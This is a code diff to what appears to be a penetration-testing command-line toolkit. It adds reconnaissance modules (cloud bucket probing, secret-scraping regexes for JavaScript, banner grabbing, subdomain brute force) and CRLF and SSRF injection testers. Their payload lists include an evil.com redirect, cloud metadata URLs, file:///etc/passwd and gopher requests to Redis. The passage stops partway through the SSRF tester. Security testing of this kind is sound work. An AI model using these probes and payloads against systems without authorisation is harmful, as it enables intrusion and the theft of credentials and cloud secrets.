@@ -63,7 +63,7 @@ W = Fore.WHITE
 M = Fore.MAGENTA
 RST = Style.RESET_ALL
 
-VERSION = "4.0.0"
+VERSION = "5.0.0"
 
 # ─── ASCII Art Banner ──────────────────────────────────────────────────────────
 
@@ -1643,6 +1643,739 @@ def shodan_lookup():
         print_err(f"Error: {e}")
 
 
+# ─── 31. Favicon Hash Lookup ──────────────────────────────────────────────────
+
+def favicon_hash():
+    print_header("Favicon Hash Lookup")
+    target = prompt("Domain (e.g. example.com)")
+    if not target:
+        return
+
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+
+    spinner("Fetching favicon...", 1.0)
+    urls_to_try = [
+        f"{target}/favicon.ico",
+        f"{target}/assets/favicon.ico",
+        f"{target}/static/favicon.ico",
+    ]
+    # Also try to find from HTML
+    try:
+        resp = requests.get(target, timeout=10)
+        if resp.status_code == 200 and BeautifulSoup:
+            soup = BeautifulSoup(resp.text, "html.parser")
+            for link in soup.find_all("link", rel=lambda r: r and "icon" in " ".join(r).lower()):
+                href = link.get("href", "")
+                if href:
+                    if href.startswith("//"):
+                        href = "https:" + href
+                    elif href.startswith("/"):
+                        href = target.rstrip("/") + href
+                    elif not href.startswith("http"):
+                        href = target.rstrip("/") + "/" + href
+                    urls_to_try.insert(0, href)
+    except Exception:
+        pass
+
+    favicon_data = None
+    used_url = None
+    for url in urls_to_try:
+        try:
+            r = requests.get(url, timeout=8)
+            if r.status_code == 200 and len(r.content) > 0:
+                ct = r.headers.get("Content-Type", "")
+                if "html" not in ct.lower():
+                    favicon_data = r.content
+                    used_url = url
+                    break
+        except Exception:
+            continue
+
+    if not favicon_data:
+        print_err("Could not find favicon")
+        return
+
+    import base64
+    b64_data = base64.encodebytes(favicon_data)
+    # MurmurHash3 (simplified 32-bit)
+    def mmh3_hash(data):
+        import struct as st
+        length = len(data)
+        nblocks = length // 4
+        h1 = 0
+        c1 = 0xcc9e2d51
+        c2 = 0x1b873593
+        for i in range(nblocks):
+            k1 = st.unpack_from("<I", data, i * 4)[0]
+            k1 = (k1 * c1) & 0xFFFFFFFF
+            k1 = ((k1 << 15) | (k1 >> 17)) & 0xFFFFFFFF
+            k1 = (k1 * c2) & 0xFFFFFFFF
+            h1 ^= k1
+            h1 = ((h1 << 13) | (h1 >> 19)) & 0xFFFFFFFF
+            h1 = (h1 * 5 + 0xe6546b64) & 0xFFFFFFFF
+        tail = data[nblocks * 4:]
+        k1 = 0
+        if len(tail) >= 3:
+            k1 ^= tail[2] << 16
+        if len(tail) >= 2:
+            k1 ^= tail[1] << 8
+        if len(tail) >= 1:
+            k1 ^= tail[0]
+            k1 = (k1 * c1) & 0xFFFFFFFF
+            k1 = ((k1 << 15) | (k1 >> 17)) & 0xFFFFFFFF
+            k1 = (k1 * c2) & 0xFFFFFFFF
+            h1 ^= k1
+        h1 ^= length
+        h1 ^= h1 >> 16
+        h1 = (h1 * 0x85ebca6b) & 0xFFFFFFFF
+        h1 ^= h1 >> 13
+        h1 = (h1 * 0xc2b2ae35) & 0xFFFFFFFF
+        h1 ^= h1 >> 16
+        if h1 & 0x80000000:
+            h1 -= 0x100000000
+        return h1
+
+    fav_hash = mmh3_hash(b64_data)
+    print_row("Favicon URL", used_url)
+    print_row("Size", f"{len(favicon_data)} bytes")
+    print_row("MMH3 Hash", str(fav_hash))
+    print(f"\n  {Y}Shodan Search Query:{RST}")
+    print(f"  {G}http.favicon.hash:{fav_hash}{RST}")
+    print(f"\n  {C}https://www.shodan.io/search?query=http.favicon.hash%3A{fav_hash}{RST}")
+
+
+# ─── 32. DMARC / SPF / DKIM Check ───────────────────────────────────────────
+
+def dmarc_spf_dkim():
+    print_header("DMARC / SPF / DKIM Check")
+    domain = prompt("Domain")
+    if not domain:
+        return
+
+    if dns is None:
+        print_err("dnspython required: pip install dnspython")
+        return
+
+    spinner("Checking email security records...", 1.0)
+
+    # SPF
+    print(f"\n  {Y}── SPF Record ──{RST}")
+    try:
+        answers = dns.resolver.resolve(domain, "TXT")
+        spf_found = False
+        for rdata in answers:
+            txt = rdata.to_text().strip('"')
+            if "v=spf1" in txt:
+                print_ok(f"SPF found: {txt}")
+                spf_found = True
+                if "~all" in txt:
+                    print_warn("Soft fail (~all) – emails may still be delivered")
+                elif "-all" in txt:
+                    print_ok("Hard fail (-all) – strict policy")
+                elif "+all" in txt:
+                    print_err("DANGEROUS: +all allows any server to send")
+                elif "?all" in txt:
+                    print_warn("Neutral (?all) – no policy enforced")
+        if not spf_found:
+            print_warn("No SPF record found")
+    except Exception:
+        print_warn("No SPF record found")
+
+    # DMARC
+    print(f"\n  {Y}── DMARC Record ──{RST}")
+    try:
+        answers = dns.resolver.resolve(f"_dmarc.{domain}", "TXT")
+        for rdata in answers:
+            txt = rdata.to_text().strip('"')
+            if "v=DMARC1" in txt:
+                print_ok(f"DMARC found: {txt}")
+                if "p=reject" in txt:
+                    print_ok("Policy: REJECT (strongest)")
+                elif "p=quarantine" in txt:
+                    print_warn("Policy: QUARANTINE")
+                elif "p=none" in txt:
+                    print_err("Policy: NONE (monitoring only)")
+    except Exception:
+        print_warn("No DMARC record found")
+
+    # DKIM (common selectors)
+    print(f"\n  {Y}── DKIM Records ──{RST}")
+    selectors = ["default", "google", "selector1", "selector2", "dkim", "mail",
+                 "k1", "k2", "s1", "s2", "sig1", "smtp", "mandrill", "amazonses",
+                 "mailchimp", "sendgrid", "protonmail"]
+    found_dkim = False
+    for sel in selectors:
+        try:
+            answers = dns.resolver.resolve(f"{sel}._domainkey.{domain}", "TXT")
+            for rdata in answers:
+                print_ok(f"DKIM [{sel}]: {rdata.to_text()[:80]}...")
+                found_dkim = True
+        except Exception:
+            continue
+    if not found_dkim:
+        print_warn("No DKIM records found (common selectors tested)")
+
+
+# ─── 33. Security.txt Checker ────────────────────────────────────────────────
+
+def security_txt():
+    print_header("Security.txt Checker")
+    target = prompt("Domain")
+    if not target:
+        return
+
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+
+    spinner("Checking security.txt...", 0.8)
+
+    urls = [
+        f"{target}/.well-known/security.txt",
+        f"{target}/security.txt",
+    ]
+    found = False
+    for url in urls:
+        try:
+            resp = requests.get(url, timeout=8)
+            if resp.status_code == 200 and len(resp.text.strip()) > 0:
+                ct = resp.headers.get("Content-Type", "")
+                if "html" not in ct.lower() or resp.text.strip().startswith("Contact:"):
+                    print_ok(f"Found at: {url}")
+                    print(f"\n  {Y}Content:{RST}")
+                    for line in resp.text.strip().split("\n")[:30]:
+                        line = line.strip()
+                        if line.startswith("#"):
+                            print(f"  {C}{line}{RST}")
+                        elif ":" in line:
+                            key, _, val = line.partition(":")
+                            print(f"  {Y}{key}:{RST} {W}{val.strip()}{RST}")
+                        else:
+                            print(f"  {W}{line}{RST}")
+                    found = True
+                    break
+        except Exception:
+            continue
+
+    if not found:
+        print_warn("No security.txt found")
+        print(f"  {C}Consider creating one: https://securitytxt.org/{RST}")
+
+
+# ─── 34. HTTP Methods Discovery ──────────────────────────────────────────────
+
+def http_methods():
+    print_header("HTTP Methods Discovery")
+    target = prompt("Target URL")
+    if not target:
+        return
+
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+
+    spinner("Testing HTTP methods...", 1.0)
+
+    methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT"]
+    allowed = []
+    dangerous = []
+
+    # Try OPTIONS first
+    try:
+        resp = requests.options(target, timeout=8)
+        allow_header = resp.headers.get("Allow", "")
+        if allow_header:
+            print_row("Allow Header", allow_header)
+    except Exception:
+        pass
+
+    print(f"\n  {Y}Testing individual methods:{RST}")
+    for method in methods:
+        try:
+            resp = requests.request(method, target, timeout=8, allow_redirects=False)
+            code = resp.status_code
+            if code < 400:
+                allowed.append(method)
+                if method in ("PUT", "DELETE", "TRACE", "CONNECT"):
+                    print(f"    {R}■{RST} {method:<10} → {R}{code} (DANGEROUS){RST}")
+                    dangerous.append(method)
+                else:
+                    print(f"    {G}■{RST} {method:<10} → {G}{code}{RST}")
+            elif code == 405:
+                print(f"    {Y}■{RST} {method:<10} → {Y}{code} Not Allowed{RST}")
+            else:
+                print(f"    {W}■{RST} {method:<10} → {W}{code}{RST}")
+        except Exception:
+            print(f"    {R}■{RST} {method:<10} → {R}Error{RST}")
+
+    if dangerous:
+        print(f"\n  {R}WARNING: Dangerous methods enabled: {', '.join(dangerous)}{RST}")
+    if "TRACE" in allowed:
+        print(f"  {R}TRACE enabled – possible Cross-Site Tracing (XST) attack vector{RST}")
+
+
+# ─── 35. Cloud Storage Finder ────────────────────────────────────────────────
+
+def cloud_storage_finder():
+    print_header("Cloud Storage Finder")
+    keyword = prompt("Keyword / Company name")
+    if not keyword:
+        return
+
+    spinner("Probing cloud storage...", 1.5)
+
+    mutations = [keyword, keyword.lower(), keyword.replace(" ", "-"),
+                 keyword.replace(" ", ""), keyword.lower().replace(" ", "-"),
+                 f"{keyword}-backup", f"{keyword}-dev", f"{keyword}-staging",
+                 f"{keyword}-prod", f"{keyword}-assets", f"{keyword}-data",
+                 f"{keyword}-public", f"{keyword}-private", f"{keyword}-media",
+                 f"{keyword}-uploads", f"{keyword}-static", f"{keyword}-files"]
+
+    providers = {
+        "AWS S3": "https://{}.s3.amazonaws.com",
+        "Azure Blob": "https://{}.blob.core.windows.net",
+        "GCP Storage": "https://storage.googleapis.com/{}",
+        "DigitalOcean Spaces": "https://{}.nyc3.digitaloceanspaces.com",
+    }
+
+    found = []
+    print(f"\n  {Y}Testing {len(mutations)} mutations across {len(providers)} providers...{RST}\n")
+
+    def check_bucket(name, provider, url_tpl):
+        url = url_tpl.format(name)
+        try:
+            resp = requests.head(url, timeout=5)
+            return (provider, name, url, resp.status_code)
+        except Exception:
+            return None
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
+        futures = []
+        for name in mutations:
+            for provider, tpl in providers.items():
+                futures.append(executor.submit(check_bucket, name, provider, tpl))
+
+        for future in concurrent.futures.as_completed(futures):
+            result = future.result()
+            if result:
+                provider, name, url, code = result
+                if code in (200, 403):
+                    found.append(result)
+                    status = f"{G}OPEN (200)" if code == 200 else f"{Y}EXISTS but 403"
+                    print(f"    {G}[+]{RST} {provider}: {W}{name}{RST} → {status}{RST}")
+                    print(f"        {C}{url}{RST}")
+
+    if not found:
+        print_warn("No cloud storage buckets found")
+    else:
+        print(f"\n  {Y}Total found: {G}{len(found)}{RST}")
+        open_buckets = [f for f in found if f[3] == 200]
+        if open_buckets:
+            print(f"  {R}WARNING: {len(open_buckets)} bucket(s) are PUBLICLY ACCESSIBLE!{RST}")
+
+
+# ─── 36. JS Endpoint Extractor ───────────────────────────────────────────────
+
+def js_endpoint_extractor():
+    print_header("JS Endpoint Extractor")
+    target = prompt("Target URL")
+    if not target:
+        return
+
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+
+    if BeautifulSoup is None:
+        print_err("beautifulsoup4 required: pip install beautifulsoup4")
+        return
+
+    spinner("Fetching page and scripts...", 1.5)
+
+    try:
+        resp = requests.get(target, timeout=10)
+    except Exception as e:
+        print_err(f"Error fetching page: {e}")
+        return
+
+    soup = BeautifulSoup(resp.text, "html.parser")
+    scripts = soup.find_all("script")
+    js_urls = []
+    inline_js = []
+
+    for s in scripts:
+        src = s.get("src")
+        if src:
+            if src.startswith("//"):
+                src = "https:" + src
+            elif src.startswith("/"):
+                parsed = urlparse(target)
+                src = f"{parsed.scheme}://{parsed.netloc}{src}"
+            elif not src.startswith("http"):
+                src = target.rstrip("/") + "/" + src
+            js_urls.append(src)
+        elif s.string:
+            inline_js.append(s.string)
+
+    print_row("JS Files Found", str(len(js_urls)))
+    print_row("Inline Scripts", str(len(inline_js)))
+
+    all_js = "\n".join(inline_js)
+    for url in js_urls[:20]:
+        try:
+            r = requests.get(url, timeout=8)
+            if r.status_code == 200:
+                all_js += "\n" + r.text
+        except Exception:
+            continue
+
+    # Extract patterns
+    patterns = {
+        "API Endpoints": r'["\'](?:/api/[^\s"\'<>]+)["\']',
+        "Full URLs": r'https?://[^\s"\'<>}{)(\]]+',
+        "Relative Paths": r'["\'](?:/[a-zA-Z][a-zA-Z0-9_/.-]{2,})["\']',
+        "AWS Keys": r'AKIA[0-9A-Z]{16}',
+        "API Keys": r'["\'](?:api[_-]?key|apikey|api_secret|token)["\'][\s]*[:=][\s]*["\']([^"\']+)["\']',
+        "Auth Tokens": r'["\'](?:Bearer|Basic)\s+[A-Za-z0-9+/=._-]+["\']',
+        "Email Addresses": r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
+        "IP Addresses": r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b',
+        "JWT Tokens": r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
+    }
+
+    for label, pattern in patterns.items():
+        matches = list(set(re.findall(pattern, all_js)))
+        if matches:
+            print(f"\n  {Y}── {label} ({len(matches)}) ──{RST}")
+            for m in sorted(matches)[:15]:
+                m = m.strip("\"'")
+                print(f"    {C}•{RST} {m}")
+            if len(matches) > 15:
+                print(f"    {Y}... and {len(matches) - 15} more{RST}")
+
+
+# ─── 37. WAF Detector ────────────────────────────────────────────────────────
+
+WAF_SIGNATURES = {
+    "Cloudflare": {"headers": ["cf-ray", "cf-cache-status", "cf-request-id"],
+                   "cookies": ["__cfduid", "__cf_bm"], "body": ["cloudflare"]},
+    "AWS WAF / CloudFront": {"headers": ["x-amz-cf-id", "x-amz-cf-pop"],
+                             "cookies": [], "body": ["awselb"]},
+    "Akamai": {"headers": ["x-akamai-transformed", "akamai-grn"],
+               "cookies": ["akamai"], "body": ["akamai"]},
+    "Sucuri": {"headers": ["x-sucuri-id", "x-sucuri-cache"],
+               "cookies": ["sucuri"], "body": ["sucuri"]},
+    "Imperva / Incapsula": {"headers": ["x-iinfo", "x-cdn"],
+                            "cookies": ["visid_incap_", "incap_ses_"], "body": ["incapsula"]},
+    "F5 BIG-IP": {"headers": ["x-cnection", "x-wa-info"],
+                  "cookies": ["BIGipServer", "TS"], "body": ["bigip"]},
+    "ModSecurity": {"headers": ["mod_security", "modsecurity"],
+                    "cookies": [], "body": ["mod_security", "modsecurity", "noyb"]},
+    "DDoS-Guard": {"headers": ["ddos-guard"],
+                   "cookies": [], "body": ["ddos-guard"]},
+    "Wordfence": {"headers": [],
+                  "cookies": ["wfvt_"], "body": ["wordfence"]},
+    "StackPath": {"headers": ["x-sp-waf"],
+                  "cookies": [], "body": ["stackpath"]},
+    "Barracuda": {"headers": ["barra_counter_session"],
+                  "cookies": ["barra_counter_session"], "body": ["barracuda"]},
+    "Fortinet / FortiWeb": {"headers": ["fortiwafsid"],
+                            "cookies": ["FORTIWAFSID"], "body": ["fortigate"]},
+}
+
+
+def waf_detector():
+    print_header("WAF / CDN Detector")
+    target = prompt("Target URL")
+    if not target:
+        return
+
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+
+    spinner("Probing for WAF signatures...", 1.5)
+
+    detected = []
+
+    # Normal request
+    try:
+        resp = requests.get(target, timeout=10)
+        headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
+        cookies_str = str(resp.cookies.get_dict()).lower()
+        body_lower = resp.text[:5000].lower()
+        server = resp.headers.get("Server", "")
+        if server:
+            print_row("Server Header", server)
+
+        for waf_name, sigs in WAF_SIGNATURES.items():
+            score = 0
+            for h in sigs["headers"]:
+                if h.lower() in headers_lower:
+                    score += 2
+            for c in sigs["cookies"]:
+                if c.lower() in cookies_str:
+                    score += 2
+            for b in sigs["body"]:
+                if b.lower() in body_lower:
+                    score += 1
+            if score > 0:
+                detected.append((waf_name, score))
+    except Exception as e:
+        print_err(f"Error: {e}")
+        return
+
+    # Malicious request to trigger WAF
+    try:
+        mal_url = target.rstrip("/") + "/<script>alert(1)</script>?id=' OR 1=1--"
+        resp2 = requests.get(mal_url, timeout=10, allow_redirects=False)
+        if resp2.status_code in (403, 406, 429, 503):
+            print_ok(f"WAF triggered (malicious request → HTTP {resp2.status_code})")
+        headers2 = {k.lower(): v.lower() for k, v in resp2.headers.items()}
+        body2 = resp2.text[:5000].lower()
+        for waf_name, sigs in WAF_SIGNATURES.items():
+            for h in sigs["headers"]:
+                if h.lower() in headers2:
+                    already = any(w == waf_name for w, _ in detected)
+                    if not already:
+                        detected.append((waf_name, 2))
+            for b in sigs["body"]:
+                if b.lower() in body2:
+                    already = any(w == waf_name for w, _ in detected)
+                    if not already:
+                        detected.append((waf_name, 1))
+    except Exception:
+        pass
+
+    detected.sort(key=lambda x: x[1], reverse=True)
+    if detected:
+        print(f"\n  {Y}Detected WAF/CDN:{RST}")
+        for waf_name, score in detected:
+            confidence = "HIGH" if score >= 3 else "MEDIUM" if score >= 2 else "LOW"
+            clr = G if score >= 3 else Y if score >= 2 else W
+            print(f"    {clr}■{RST} {waf_name} (confidence: {clr}{confidence}{RST})")
+    else:
+        print_warn("No WAF/CDN detected (may still be present but undetected)")
+
+
+# ─── 38. Banner Grabbing ─────────────────────────────────────────────────────
+
+BANNER_PORTS = {
+    21: ("FTP", None),
+    22: ("SSH", None),
+    23: ("Telnet", None),
+    25: ("SMTP", b"EHLO argus\r\n"),
+    80: ("HTTP", b"HEAD / HTTP/1.0\r\nHost: target\r\n\r\n"),
+    110: ("POP3", None),
+    143: ("IMAP", None),
+    443: ("HTTPS", None),
+    587: ("SMTP-TLS", b"EHLO argus\r\n"),
+    3306: ("MySQL", None),
+    5432: ("PostgreSQL", None),
+    6379: ("Redis", b"INFO\r\n"),
+    8080: ("HTTP-Alt", b"HEAD / HTTP/1.0\r\nHost: target\r\n\r\n"),
+    8443: ("HTTPS-Alt", None),
+    27017: ("MongoDB", None),
+}
+
+
+def banner_grab():
+    print_header("Banner Grabbing")
+    target = prompt("Target host")
+    if not target:
+        return
+
+    ports_input = prompt("Ports (comma-separated, or 'common' for default)")
+    if not ports_input:
+        return
+
+    if ports_input.lower() in ("common", "default", "all"):
+        ports = list(BANNER_PORTS.keys())
+    else:
+        try:
+            ports = [int(p.strip()) for p in ports_input.split(",")]
+        except ValueError:
+            print_err("Invalid port numbers")
+            return
+
+    spinner("Grabbing banners...", 1.0)
+
+    def grab_one(port):
+        service = BANNER_PORTS.get(port, ("Unknown", None))[0]
+        probe = BANNER_PORTS.get(port, (None, None))[1]
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(5)
+            s.connect((target, port))
+            if probe:
+                s.send(probe)
+            banner = s.recv(1024).decode(errors="replace").strip()
+            s.close()
+            return port, service, banner
+        except Exception:
+            return port, service, None
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
+        futures = {executor.submit(grab_one, p): p for p in ports}
+        results = []
+        for future in concurrent.futures.as_completed(futures):
+            results.append(future.result())
+
+    results.sort(key=lambda x: x[0])
+    found = False
+    for port, service, banner in results:
+        if banner:
+            found = True
+            banner_short = banner[:100].replace("\n", " | ")
+            print(f"\n  {G}Port {port}/{service}:{RST}")
+            print(f"    {W}{banner_short}{RST}")
+
+    if not found:
+        print_warn("No banners retrieved (ports may be closed or filtered)")
+
+
+# ─── 39. Subdomain Bruteforce ────────────────────────────────────────────────
+
+SUBDOMAIN_WORDLIST = [
+    "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "ns2",
+    "ns3", "ns4", "dns", "dns1", "dns2", "api", "dev", "staging", "stage",
+    "test", "testing", "beta", "alpha", "demo", "app", "apps", "admin",
+    "portal", "blog", "shop", "store", "forum", "wiki", "docs", "doc",
+    "help", "support", "status", "monitor", "cdn", "assets", "static",
+    "media", "images", "img", "video", "vpn", "remote", "gateway",
+    "proxy", "cache", "web", "web1", "web2", "server", "server1",
+    "server2", "db", "database", "mysql", "postgres", "redis", "mongo",
+    "elastic", "search", "git", "gitlab", "github", "jenkins", "ci", "cd",
+    "build", "deploy", "docker", "k8s", "kube", "kubernetes", "grafana",
+    "prometheus", "kibana", "logstash", "sentry", "jira", "confluence",
+    "slack", "chat", "irc", "mx", "mx1", "mx2", "exchange", "owa",
+    "autodiscover", "sip", "voip", "pbx", "ssh", "sftp", "backup",
+    "bak", "old", "new", "v1", "v2", "internal", "intranet", "extranet",
+    "secure", "login", "auth", "sso", "oauth", "id", "identity",
+    "accounts", "account", "billing", "payment", "pay", "checkout",
+    "crm", "erp", "hr", "finance", "sales", "marketing", "analytics",
+    "track", "tracking", "report", "reports", "dashboard", "panel",
+    "cp", "cpanel", "whm", "plesk", "webmin", "phpmyadmin", "pma",
+    "m", "mobile", "wap", "preview", "sandbox", "qa", "uat",
+    "prod", "production", "live", "www2", "www3", "origin", "edge",
+]
+
+
+def subdomain_brute():
+    print_header("Subdomain Bruteforce")
+    domain = prompt("Domain (e.g. example.com)")
+    if not domain:
+        return
+
+    custom = input(f"  {Y}Use custom wordlist file? (path or Enter for built-in):{RST} ").strip()
+    wordlist = SUBDOMAIN_WORDLIST
+    if custom:
+        try:
+            with open(custom, "r") as f:
+                wordlist = [line.strip() for line in f if line.strip()]
+            print_ok(f"Loaded {len(wordlist)} words from {custom}")
+        except Exception as e:
+            print_err(f"Could not load wordlist: {e}")
+            return
+
+    spinner(f"Bruteforcing {len(wordlist)} subdomains...", 1.0)
+    found = []
+
+    def resolve_sub(sub):
+        fqdn = f"{sub}.{domain}"
+        try:
+            ip = socket.gethostbyname(fqdn)
+            return fqdn, ip
+        except socket.gaierror:
+            return None
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+        futures = {executor.submit(resolve_sub, sub): sub for sub in wordlist}
+        for future in concurrent.futures.as_completed(futures):
+            result = future.result()
+            if result:
+                fqdn, ip = result
+                found.append((fqdn, ip))
+                print(f"    {G}[+]{RST} {C}{fqdn:<40}{RST} → {W}{ip}{RST}")
+
+    print(f"\n  {Y}Total found: {G}{len(found)}{RST} / {len(wordlist)} tested")
+
+
+# ─── 40. Ping Sweep ──────────────────────────────────────────────────────────
+
+def ping_sweep():
+    print_header("Ping Sweep / Host Discovery")
+    cidr = prompt("IP range (e.g. 192.168.1.0/24 or 192.168.1.1-50)")
+    if not cidr:
+        return
+
+    # Parse IP range
+    ips = []
+    if "/" in cidr:
+        parts = cidr.split("/")
+        base_ip = parts[0]
+        mask = int(parts[1])
+        octets = list(map(int, base_ip.split(".")))
+        base = (octets[0] << 24) | (octets[1] << 16) | (octets[2] << 8) | octets[3]
+        num_hosts = 2 ** (32 - mask)
+        for i in range(1, min(num_hosts - 1, 1024)):
+            ip_int = base + i
+            ips.append(f"{(ip_int >> 24) & 0xFF}.{(ip_int >> 16) & 0xFF}.{(ip_int >> 8) & 0xFF}.{ip_int & 0xFF}")
+    elif "-" in cidr:
+        base, _, end_part = cidr.rpartition(".")
+        if "-" in end_part:
+            start, _, end = end_part.partition("-")
+            for i in range(int(start), int(end) + 1):
+                ips.append(f"{base}.{i}")
+        else:
+            print_err("Invalid range format")
+            return
+    else:
+        print_err("Use CIDR notation (x.x.x.x/24) or range (x.x.x.1-50)")
+        return
+
+    print_row("Hosts to scan", str(len(ips)))
+    spinner("Scanning...", 1.0)
+
+    alive = []
+
+    def check_host(ip):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1)
+            result = s.connect_ex((ip, 80))
+            s.close()
+            if result == 0:
+                return ip, "80/tcp open"
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1)
+            result = s.connect_ex((ip, 443))
+            s.close()
+            if result == 0:
+                return ip, "443/tcp open"
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1)
+            result = s.connect_ex((ip, 22))
+            s.close()
+            if result == 0:
+                return ip, "22/tcp open"
+            return None
+        except Exception:
+            return None
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
+        futures = {executor.submit(check_host, ip): ip for ip in ips}
+        for future in concurrent.futures.as_completed(futures):
+            result = future.result()
+            if result:
+                ip, info = result
+                alive.append(ip)
+                try:
+                    hostname = socket.gethostbyaddr(ip)[0]
+                except Exception:
+                    hostname = ""
+                host_info = f" ({hostname})" if hostname else ""
+                print(f"    {G}[+]{RST} {C}{ip:<16}{RST} {W}{info}{host_info}{RST}")
+
+    print(f"\n  {Y}Alive hosts: {G}{len(alive)}{RST} / {len(ips)} scanned")
+
+
 # ═══════════════════════════════════════════════════════════════════════════════
 #                          EXPLOITATION MODULES
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -2662,6 +3395,843 @@ def payload_encoder():
     print(f"  {G}{result}{RST}")
 
 
+# ─── 51. CRLF Injection Tester ────────────────────────────────────────────────
+
+CRLF_PAYLOADS = [
+    ("%0d%0aInjected-Header:true", "URL-encoded CRLF"),
+    ("%0d%0a%0d%0a<html>INJECTED</html>", "HTTP response splitting"),
+    ("%0AInjected-Header:true", "LF only"),
+    ("%0DInjected-Header:true", "CR only"),
+    ("%E5%98%8A%E5%98%8DInjected-Header:true", "Unicode CRLF bypass"),
+    ("%23%0d%0aInjected-Header:true", "Hash + CRLF"),
+    ("%3F%0d%0aInjected-Header:true", "Question mark + CRLF"),
+    ("\\r\\nInjected-Header:true", "Literal backslash CRLF"),
+    ("%0d%0aSet-Cookie:crlf=injected", "Cookie injection via CRLF"),
+    ("%0d%0aLocation:https://evil.com", "Redirect via CRLF"),
+]
+
+
+def crlf_injection():
+    print_header("CRLF Injection Tester")
+    if not exploit_disclaimer():
+        return
+
+    url = prompt("Target URL with parameter (e.g. http://target.com/page?url=value)")
+    if not url:
+        return
+
+    parsed = urlparse(url)
+    if "=" not in parsed.query:
+        print_err("URL must contain a query parameter")
+        return
+
+    params = parsed.query.split("&")
+    print(f"\n  {Y}Parameters found:{RST}")
+    for i, p in enumerate(params):
+        print(f"    {C}{i+1}.{RST} {p}")
+
+    param_idx = input(f"\n  {Y}Select parameter (1-{len(params)}):{RST} ").strip()
+    try:
+        idx = int(param_idx) - 1
+        if not (0 <= idx < len(params)):
+            print_err("Invalid selection")
+            return
+    except ValueError:
+        print_err("Invalid input")
+        return
+
+    param_name = params[idx].split("=")[0]
+    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+
+    print(f"\n  {Y}Testing {len(CRLF_PAYLOADS)} CRLF payloads on '{param_name}'...{RST}\n")
+    found = 0
+
+    for payload, desc in CRLF_PAYLOADS:
+        test_params = params.copy()
+        test_params[idx] = f"{param_name}={payload}"
+        test_url = f"{base_url}?{'&'.join(test_params)}"
+        try:
+            resp = requests.get(test_url, timeout=8, allow_redirects=False)
+            if "injected-header" in str(resp.headers).lower() or "Injected-Header" in resp.headers:
+                print(f"    {R}[VULN]{RST} {desc}")
+                print(f"           Header injected successfully!")
+                found += 1
+            elif "crlf=injected" in str(resp.headers.get("Set-Cookie", "")):
+                print(f"    {R}[VULN]{RST} {desc}")
+                print(f"           Cookie injection via CRLF!")
+                found += 1
+            else:
+                print(f"    {W}[SAFE]{RST} {desc}")
+        except Exception:
+            print(f"    {Y}[ERR]{RST}  {desc}")
+
+    if found:
+        print(f"\n  {R}VULNERABLE: {found} CRLF injection(s) found!{RST}")
+    else:
+        print(f"\n  {G}No CRLF injection vulnerabilities detected{RST}")
+
+
+# ─── 52. SSRF Tester ─────────────────────────────────────────────────────────
+
+SSRF_PAYLOADS = [
+    ("http://127.0.0.1", "Localhost IPv4"),
+    ("http://localhost", "Localhost hostname"),
+    ("http://[::1]", "Localhost IPv6"),
+    ("http://0.0.0.0", "All interfaces"),
+    ("http://0177.0.0.1", "Octal localhost"),
+    ("http://0x7f000001", "Hex localhost"),
+    ("http://2130706433", "Decimal localhost"),
+    ("http://127.1", "Short localhost"),
+    ("http://169.254.169.254", "AWS metadata"),
+    ("http://169.254.169.254/latest/meta-data/", "AWS metadata path"),
+    ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
+    ("http://169.254.169.254/metadata/v1/", "Azure metadata"),
+    ("http://100.100.100.200/latest/meta-data/", "Alibaba metadata"),
+    ("dict://127.0.0.1:6379/INFO", "Redis via dict://"),
+    ("gopher://127.0.0.1:6379/_INFO", "Redis via gopher://"),
+    ("file:///etc/passwd", "Local file read"),
+    ("http://[0:0:0:0:0:ffff:127.0.0.1]", "IPv6 mapped IPv4"),
+    ("http://127.0.0.1:80", "Localhost port 80"),
+    ("http://127.0.0.1:22", "Localhost SSH"),
+    ("http://127.0.0.1:3306", "Localhost MySQL"),
+]
+
+
+def ssrf_tester():
+    print_header("SSRF Tester")
+    if not exploit_disclaimer():
+        return
+
+    url = prompt("Target URL with parameter (e.g. http://target.com/fetch?url=value)")
+    if not url:
+        return
+
+    parsed = urlparse(url)
+    if "=" not in parsed.query:
+        print_err("URL must contain a query parameter")
+        return
+
+    params = parsed.query.split("&")
+    print(f"\n  {Y}Parameters found:{RST}")
+    for i, p in enumerate(params):
+        print(f"    {C}{i+1}.{RST} {p}")
+
+    param_idx = input(f"\n  {Y}Select parameter to test (1-{len(params)}):{RST} ").strip()
+    try:
+        idx = int(param_idx) - 1
+        if not (0 <= idx < len(params)):
+            print_err("Invalid selection")
+            return
+    except ValueError:
+        print_err("Invalid input")
+        return
+
+    param_name = params[idx].split("=")[0]
+    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+
+    # Baseline
+    try:
+        baseline = requests.get(url, timeout=10)
+        baseline_len = len(baseline.text)
+        baseline_code = baseline.status_code
+    except Exception:
+        baseline_len = 0
+        baseline_code = 0
+
+    print(f"\n  {Y}Testing {len(SSRF_PAYLOADS)} SSRF payloads...{RST}")
